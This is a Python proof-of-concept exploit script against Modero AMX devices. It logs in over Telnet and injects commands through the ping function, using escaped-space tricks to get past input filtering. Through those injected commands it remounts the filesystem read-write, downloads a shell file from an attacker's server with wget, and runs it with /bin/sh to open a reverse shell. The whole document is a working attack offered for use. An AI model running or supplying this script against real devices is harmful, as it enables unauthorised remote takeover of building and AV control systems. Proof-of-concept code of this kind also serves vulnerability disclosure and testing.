import time
import telnetlib
import argparse
parser = argparse.ArgumentParser(description='Reverse Shell POC for Modero AMX devices by @Insecurities on Github')
parser.add_argument('-t','--target', help='IP address of the AMX server', required=True)
parser.add_argument('-fs','--fileserver', help='Server where your Shell file will be hosted (i.e 192.168.0.2)', required=True)
parser.add_argument('-fn','--filename', help='name of the shell file hosted on your server', required=True)
parser.add_argument('-v','--verbose',help='Verbosity of the Telnet session, default = 0, use -v 1 for more verbose output', required=False,default=0,type=int, choices=[1,0])
args = parser.parse_args()

    

def telnet():

    print("[*] RUNNING")
    tn = telnetlib.Telnet("%s"% args.target)
    tn.set_debuglevel(args.verbose)
    #sleeps to give Telnet some time to exist
    time.sleep(5)
    print(tn.read_until(b">", 2))

    #First command, sets the system to allow read/write.
    raw  = b"ping ;CMD=$'\\x20-o\\x20remount,rw\\x20/'&&mount$CMD\r\n"
    tn.write(raw)
    tn.read_until(b">",2)

    #Downloads the file
    print("taking a snooze")
    time.sleep(10)   
    raw = b"ping ;CMD=$'\\x20http://"+args.fileserver.encode('ascii') +b"/"+args.filename.encode('ascii')+b"'&&wget$CMD\r\n"
    tn.write(raw)

    #Executes the file
    print("taking a snooze")
    time.sleep(10)
    raw = b"ping ;CMD=$'\\x20"+args.filename.encode('ascii')+b"'&&/bin/sh$CMD\r\n"
    tn.write(raw)
    print(tn.read_until(b">",2))
    print("Shell should have caught, check yer netcat")
    time.sleep(2)
    print("exiting!")
    tn.close    
 

def confirmStart():
    print("[!] Your current settings are:")
    print("[*] Target: %s" % args.target)    
    print("[*] FileServer and Filename URL: http://%s/%s" %(args.fileserver,args.filename))
    print("[*] Verbosity: %r" % args.verbose)
    confirmation = input("(^_^)7  Continue? (Y/N): ").upper()
    if confirmation ==  "Y":
        telnet()
    elif confirmation == "N":
        print("See ya later")
        exit()
    else:
        print("[!] INVALID OPTION - Please enter Y or N:")
        time.sleep(1)
        confirmStart()
        

confirmStart()
